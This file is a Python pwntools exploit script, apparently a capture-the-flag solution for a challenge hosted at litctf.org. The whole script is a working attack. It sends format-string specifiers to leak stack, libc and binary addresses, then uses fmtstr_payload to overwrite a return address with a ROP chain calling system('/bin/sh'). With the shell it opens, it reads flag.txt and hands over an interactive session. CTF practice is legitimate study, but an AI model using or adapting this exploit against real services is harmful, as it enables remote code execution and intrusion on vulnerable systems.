from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./main.patch"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("litctf.org", 31772)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

io.sendline(b"--%12$p--%16$p--%67$p--")
io.recvuntil("--", drop=True)
leak = int(io.recv(14), 16)
rbp = leak + 0xd0
log.success("rbp:-----> " + hex(rbp))

io.recvuntil("--", drop=True)
leak = int(io.recv(14), 16)
libc.address = leak - 0x5ee728
log.success("libc :-----> " + hex(libc.address))

io.recvuntil("--", drop=True)
leak = int(io.recv(14), 16)
elf.address = leak - 0x124d
log.success("elf :-----> " + hex(elf.address))


system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))
pop_rdi = next(libc.search(asm("pop rdi; ret")))
ret = next(libc.search(asm("ret")))

print_ret = rbp - 0x228
p = {
    print_ret: pop_rdi,
    print_ret+8: binsh_addr,
    print_ret+16: system_addr,
}
log.success(hex(print_ret) +"--" + hex(pop_rdi))
log.success(hex(print_ret+8) +"--" + hex(binsh_addr))
log.success(hex(print_ret+16) +"--" + hex(system_addr))

ddebug("breakrva 0x11dd\n continue")
payload = fmtstr_payload(8, p, write_size="byte")
io.sendline(payload)

io.sendline(b"cat flag.txt")


io.interactive()
